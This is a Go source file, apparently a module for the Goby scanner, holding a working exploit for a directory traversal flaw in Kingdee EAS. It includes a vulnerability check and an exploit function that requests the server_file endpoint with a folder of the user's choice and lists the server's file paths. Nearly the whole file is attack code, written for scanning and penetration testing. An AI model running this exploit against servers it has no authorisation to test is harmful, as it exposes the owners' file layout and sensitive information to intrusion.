package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"regexp"
)

func init() {
	expJson := `{
  "Name": "Kingdee EAS server_file Directory traversal",
  "Description": "Kingdee EAS server file Directory traversal,The attacker can obtain the sensitive information of the server through directory traversal",
  "Product": "Kingdee EAS",
  "Homepage": "https://www.kingdee.com/",
  "DisclosureDate": "2021-06-03",
  "Author": "PeiQi",
  "GobyQuery": "app=\"kingdee-EAS\"",
  "Level": "1",
  "Impact": "<p>Directory traversal</p>",
  "Recommendation": "",
  "References": [
    "http://wiki.peiqi.tech"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "Dir",
      "type": "input",
      "value": "/"
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND"
  ],
  "ExploitSteps": null,
  "Tags": [
    "Directory traversal"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": [
      "Kingdee EAS"
    ],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  },
  "Recommandation": "<p>undefined</p>"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/appmonitor/protected/selector/server_file/files?folder=/&suffix="
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
        		return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "folder")
        	}
        	return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
		    dir := ss.Params["Dir"].(string)
		    uri := "/appmonitor/protected/selector/server_file/files?folder=" + dir + "&suffix="
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
			    re := regexp.MustCompile(`"path":"(.*?)"`).FindAllString(resp.RawBody, -1)
			    data := ""
			    for _, path := range re {
                    data += path + "\r\n"
                }
        		expResult.Output = data
        		expResult.Success = true
        	}
			return expResult
		},
	))
}           
